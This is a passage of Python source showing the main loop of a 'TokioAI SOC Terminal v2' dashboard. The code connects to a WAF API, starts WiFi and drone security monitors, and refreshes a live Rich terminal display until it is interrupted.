    parser.add_argument("--refresh", type=float, default=REFRESH_INTERVAL,
                        help="Refresh interval in seconds")
    parser.add_argument("--raspi", default=RASPI_IP,
                        help="Raspi IP (Tailscale)")
    args = parser.parse_args()

    console.clear()
    console.print("[bold cyan]TokioAI SOC Terminal v2[/] starting...", style="cyan")
    console.print("[dim]WAF + WiFi Defense + Drone Control[/]")

    # WAF client
    if args.demo:
        console.print("[yellow]DEMO MODE[/]", style="yellow")
        client = DemoClient()
    else:
        console.print(f"Connecting to WAF API: {args.api}...", style="dim")
        client = DashboardClient(args.api, args.user, args.password)
        if client.is_connected():
            console.print("[green]WAF API connected[/]")
        else:
            console.print("[red]WAF API: auth failed, retrying...[/]")

    # WiFi monitor
    wifi_monitor = None
    if not args.no_wifi:
        console.print(f"Starting WiFi security monitor (Raspi: {args.raspi})...", style="dim")
        wifi_monitor = WiFiSecurityMonitor(args.raspi)
        wifi_monitor.start()
        console.print("[green]WiFi monitor active[/]")

    # Drone monitor
    drone_monitor = None
    if not args.no_drone:
        console.print("Starting drone monitor...", style="dim")
        drone_monitor = DroneMonitor()
        drone_monitor.start()
        console.print("[green]Drone monitor active[/]")

    narrator = AutonomousNarrator()

    if args.autonomous:
        console.print("[cyan]AUTONOMOUS MODE — Tokio narrating security events[/]")

    console.print(f"Refresh: {args.refresh}s | Ctrl+C to exit\n")
    time.sleep(1.5)

    try:
        with Live(console=console, refresh_per_second=1, screen=True) as live:
            while True:
                layout = build_layout(client, narrator, args.autonomous,
                                     wifi_monitor, drone_monitor)
                live.update(layout)
                time.sleep(args.refresh)
    except KeyboardInterrupt:
        console.print("\n[cyan]TokioAI SOC Terminal v2[/] — shutdown.", style="dim")
        if wifi_monitor:
            wifi_monitor.stop()
        if drone_monitor:
            drone_monitor.stop()


if __name__ == "__main__":
    main()
